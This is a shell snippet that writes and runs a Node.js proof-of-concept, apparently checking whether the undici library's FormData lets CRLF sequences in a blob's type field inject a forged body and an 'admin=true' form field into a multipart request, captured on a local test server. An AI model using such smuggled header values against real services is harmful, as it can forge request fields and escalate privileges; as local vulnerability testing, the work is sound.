cat > "$TMPDIR/filelike-test.js" <<'EOF'
const net = require('node:net')
const undici = require('/tmp/workspaces/89d6179739f7f9a9/tree')
const { Readable } = require('node:stream')

const EVIL = 'text/plain\r\n\r\nINJECTED-BODY\r\n------formdata-undici-0x\r\nContent-Disposition: form-data; name="admin"\r\n\r\ntrue'

const blobLike = {
  [Symbol.toStringTag]: 'Blob',
  size: 4,
  type: EVIL,
  stream () { return Readable.toWeb(Readable.from([Buffer.from('data')])) },
  arrayBuffer: async () => new Uint8Array([100, 97, 116, 97]).buffer,
  slice () { return this }
}

const server = net.createServer((socket) => {
  let d = ''
  socket.on('data', (c) => {
    d += c
    if (d.includes('INJECTED-BODY') || d.length > 400) {
      console.log(d.replace(/\r\n/g, '\\r\\n\n'))
      socket.destroy(); server.close(); process.exit(0)
    }
  })
})
server.listen(0, '127.0.0.1', () => {
  const fd = new undici.FormData()
  fd.append('f', blobLike, 'a.txt')
  undici.fetch(`http://127.0.0.1:${server.address().port}/`, { method: 'POST', body: fd }).catch((e) => { console.log('err', e.message, e.cause?.message) })
})
setTimeout(() => process.exit(0), 8000)
EOF
cd "$TMPDIR" && timeout 20 node "$TMPDIR/filelike-test.js" 2>&1 | head -40

